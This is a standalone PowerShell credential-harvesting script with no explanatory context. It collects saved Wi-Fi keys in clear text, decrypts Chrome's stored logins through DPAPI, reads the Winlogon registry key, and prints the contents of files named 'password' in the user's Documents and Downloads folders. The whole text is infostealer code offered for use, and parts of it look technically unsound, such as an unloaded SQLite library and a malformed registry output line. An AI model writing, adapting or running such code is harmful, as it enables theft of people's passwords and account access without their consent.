# Harvest Wi-Fi passwords
$profiles = netsh wlan show profiles
foreach ($profile in $profiles.Split("`n")) {
    if ($profile -match "All User Profile") {
        $profileName = $profile.Split(":")[1].Trim()
        $result = netsh wlan show profile name=$profileName key=clear
        Write-Output $result
    }
}

# Harvest Chrome browser passwords
$loginDataPath = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Google\Chrome\User Data\Default\Login Data")
if (Test-Path $loginDataPath) {
    $conn = [System.Data.SQLite.SQLiteFactory]::Instance.CreateConnection()
    $conn.ConnectionString = "Data Source=$loginDataPath;Version=3"
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = $reader["password_value"]
        $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encryptedPassword, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
        Write-Output "URL: $url, Username: $username, Password: $password"
    }
    $conn.Close()
}

# Harvest registry stored passwords
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty -Path $registryPath | ForEach-Object {
    Write-Output "Registry Key: $_.Name, Value: $_.Value"
}

# Harvest local files containing 'password' in the name
$directoriesToSearch = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
foreach ($directory in $directoriesToSearch) {
    Get-ChildItem -Path $directory -Recurse -File | Where-Object { $_.Name -match 'password' } | ForEach-Object {
        $fileContent = Get-Content -Path $_.FullName
        Write-Output $fileContent
    }
}
